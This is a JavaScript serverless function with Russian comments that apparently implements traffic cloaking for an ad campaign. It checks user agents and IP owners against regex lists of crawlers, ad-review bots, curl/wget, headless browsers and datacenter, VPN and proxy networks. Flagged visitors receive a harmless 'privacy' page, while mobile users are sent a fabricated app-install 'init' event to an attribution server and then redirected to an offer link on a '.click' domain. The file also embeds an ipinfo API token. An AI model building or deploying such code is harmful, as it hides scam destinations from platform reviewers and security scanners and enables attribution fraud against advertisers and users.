// Vercel Serverless Function
// Endpoint: /api/data?adid=...&refer=...
// Возвращает JSON: { "url": "https://suasotdtutr.click/6JDO8bcX?..." }
// или { "url": null, "blocked": true, "reason": "<filter>" } если трафик отсеян.

const OFFER_BASE = "https://suasotdtutr.click/zVpW3khs";
const IPINFO_TOKEN = "6c0bdcd774927f";

// ===== Настройка фильтров =====
// true = фильтр включён. Отключить любой можно, поставив false.
const FILTERS = {
  empty_ua: false,
  bot_ua: false,
  no_accept_language: false,
  not_mobile: false,
  datacenter_ip: false,
};

// ===== Утилиты =====
const enc = encodeURIComponent;

const toQuery = (obj) =>
  Object.entries(obj)
    .filter(([, v]) => v !== undefined && v !== null && String(v).length)
    .map(([k, v]) => `${enc(k)}=${enc(v)}`)
    .join("&");

function getOsVersion(ua) {
  const m = (ua || "").match(/Android\s+([0-9._]+)/i);
  return m ? m[1] : "";
}

function getDeviceModel(ua) {
  ua = ua || "";
  const buildMatch = ua.match(/;\s*([^;()]+?)\s+Build\//i);
  if (buildMatch && buildMatch[1]) return buildMatch[1].trim();
  const smMatch = ua.match(/\bSM-[A-Z0-9]+\b/i);
  if (smMatch) return smMatch[0];
  return "Unknown";
}

// Реальный IP клиента из заголовков (на сервере ipinfo.io/json вернул бы IP Vercel)
function getClientIp(req) {
  const xff = req.headers["x-forwarded-for"];
  if (xff) return String(xff).split(",")[0].trim();
  return req.headers["x-real-ip"] || req.socket?.remoteAddress || "";
}

// ===== Детекторы фильтров =====

// Признаки бота / краулера / автоматизации в User-Agent
const BOT_UA_RE = new RegExp(
  [
    "bot", "crawl", "spider", "slurp", "scan", "curl", "wget", "python",
    "java(?!script)", "go-http", "okhttp", "libwww", "httpclient", "http-client",
    "headless", "phantom", "puppeteer", "playwright", "selenium", "chrome-lighthouse",
    "google", "bing", "yandex", "baidu", "duckduck", "facebookexternalhit",
    "facebot", "ia_archiver", "ahrefs", "semrush", "mj12", "dotbot", "petalbot",
    "applebot", "gptbot", "ccbot", "claudebot", "amazonbot", "bytespider",
    "telegrambot", "whatsapp", "preview", "monitor", "uptime", "pingdom",
    "datadog", "newrelic", "apache-httpclient", "axios", "node-fetch", "postman",
    "insomnia", "fetch",
  ].join("|"),
  "i"
);

// Известные хостинги / дата-центры / cloud / VPN — по полю org (ASN) от ipinfo.
// Ловит дата-центровый трафик даже на бесплатном токене, когда нет privacy.hosting.
const DATACENTER_ORG_RE = new RegExp(
  [
    "amazon", "aws", "ec2", "google", "gcp", "microsoft", "azure", "oracle",
    "digitalocean", "linode", "akamai", "cloudflare", "fastly", "ovh",
    "hetzner", "leaseweb", "contabo", "vultr", "scaleway", "choopa", "constant",
    "quadranet", "hostwinds", "namecheap", "godaddy", "ionos", "1&1", "gcore",
    "servers", "server", "hosting", "host", "datacenter", "data center",
    "colo", "cloud", "vps", "dedicated", "m247", "psychz", "cogent", "colocation",
    "as-choopa", "digital ocean", "alibaba", "tencent", "huawei cloud",
    "limestone", "internap", "softlayer", "rackspace", "nforex", "worldstream",
    "packet", "equinix", "zenlayer", "g-core", "vpn", "proxy", "sharktech",
    "frantech", "bandwagon", "nexeon", "reliablesite", "webnx",
  ].join("|"),
  "i"
);

function isBotUa(ua) {
  return BOT_UA_RE.test(ua || "");
}

function isMobileUa(ua) {
  return /Mobi|Android|iPhone|iPad|iPod/i.test(ua || "");
}

// Определить дата-центр по ответу ipinfo
function isDatacenterIp(ipinfo) {
  if (!ipinfo) return false;
  // 1) Точный признак с платного тарифа
  if (ipinfo.privacy && (ipinfo.privacy.hosting || ipinfo.privacy.proxy || ipinfo.privacy.vpn)) {
    return true;
  }
  // 2) Явный тип ASN (некоторые ответы содержат asn.type === "hosting")
  if (ipinfo.asn && ipinfo.asn.type && /hosting|business/i.test(ipinfo.asn.type)) {
    // "business" оставляем мягким — реагируем только на hosting
    if (/hosting/i.test(ipinfo.asn.type)) return true;
  }
  // 3) Фолбэк — совпадение по org / ASN-строке
  const org = String(ipinfo.org || (ipinfo.asn && ipinfo.asn.name) || "");
  if (org && DATACENTER_ORG_RE.test(org)) return true;
  return false;
}

module.exports = async (req, res) => {
  // CORS — чтобы можно было дёргать эндпоинт с любой страницы
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, OPTIONS");
  res.setHeader("Content-Type", "application/json; charset=utf-8");
  if (req.method === "OPTIONS") return res.status(200).end();

  // ===== Параметры из запроса =====
  const url = new URL(req.url, `https://${req.headers.host}`);
  const adid = url.searchParams.get("adid") || "";
  // принимаем и refer, и ref — как удобнее прикреплять
  const refer = url.searchParams.get("refer") || url.searchParams.get("ref") || "";

  const ua = req.headers["user-agent"] || "";
  const acceptLanguage = req.headers["accept-language"] || "";

  // Хелпер: при блокировке возвращаем только безопасную ссылку
  const block = () =>
    res.status(200).json({ url: "https://privacy-two-gilt.vercel.app/" });

  // ===== ФИЛЬТР 1: пустой User-Agent =====
  if (FILTERS.empty_ua && !ua.trim()) {
    return block("empty_ua");
  }

  // ===== ФИЛЬТР 2: бот в User-Agent =====
  if (FILTERS.bot_ua && isBotUa(ua)) {
    return block("bot_ua");
  }

  // ===== ФИЛЬТР 3: нет Accept-Language =====
  if (FILTERS.no_accept_language && !acceptLanguage.trim()) {
    return block("no_accept_language");
  }

  // ===== ФИЛЬТР 4: не мобильное устройство =====
  const isMobile = isMobileUa(ua);
  if (FILTERS.not_mobile && !isMobile) {
    // десктоп — ссылку не отдаём
    return block("not_mobile");
  }

  const osVersion = getOsVersion(ua);
  const deviceModel = getDeviceModel(ua);
  const ip = getClientIp(req);

  // ===== Страна по IP + ФИЛЬТР 5: datacenter_ip =====
  let country = "";
  let ipinfo = null;
  try {
    if (ip) {
      const r = await fetch(`https://ipinfo.io/${ip}/json?token=${IPINFO_TOKEN}`);
      if (r.ok) {
        ipinfo = await r.json();
        country = ipinfo?.country || "";
      }
    }
  } catch (_) {}

  if (FILTERS.datacenter_ip && isDatacenterIp(ipinfo)) {
    return block("datacenter_ip");
  }

  // ===== 1) init URL =====
  const initParams = {
    advertising_id: adid,
    package: "com.orbitforge.wildspark",
    os_version: osVersion,
    user_device_model: deviceModel,
    user_locale: country,
    build_id: "test",
    install_reffer: refer,
    app_event_type: "init",
    real_ip: ip,
    sub_id_1: "test",
    attribution: adid,
    geo: country,
  };
  const initUrl = "https://nextlevelatri.com/api/init?" + toQuery(initParams);

  // ===== 2) Запрос init и разбор campaign_name =====
  let sValue = "";
  let extraParams = {};
  try {
    const r = await fetch(initUrl, { method: "GET" });
    let data = null;
    try {
      data = await r.clone().json();
    } catch (_) {}

    if (r.ok && data && data.campaign_name) {
      let decoded = "";
      try {
        decoded = decodeURIComponent(String(data.campaign_name));
      } catch (_) {
        decoded = String(data.campaign_name);
      }
      if (decoded.startsWith("?")) decoded = decoded.slice(1);

      const parts = decoded.split("&").filter(Boolean);
      const first = parts.shift() || "";
      let sCandidate = first;

      if (first.includes("=")) {
        const [k, v] = first.split("=", 2);
        if (k && v) {
          if (k.toLowerCase() === "s") sCandidate = v;
          else {
            extraParams[k] = v;
            sCandidate = "";
          }
        }
      }

      const rest = new URLSearchParams(parts.join("&"));
      for (const [k, v] of rest.entries()) extraParams[k] = v;

      sValue = sCandidate || "nextlevel";
      delete extraParams.s;
    } else {
      const reason =
        (data && (data.error || data.message || data.status)) ||
        (r.ok ? "no_campaign_name" : "http_" + (r.status || "unknown"));
      sValue = ("err_" + String(reason)).slice(0, 80);
    }
  } catch (_) {
    sValue = "err_fetch";
  }

  // ===== 3) Финальная оффер-ссылка =====
  const offerParams = {
    adid: adid,
    install_reffer: refer,
    s: sValue,
    ...extraParams,
  };
  const finalOfferUrl =
    OFFER_BASE + (OFFER_BASE.includes("?") ? "&" : "?") + toQuery(offerParams);

  // ===== 4) Ответ JSON — только финальная ссылка =====
  return res.status(200).json({ url: finalOfferUrl });
};
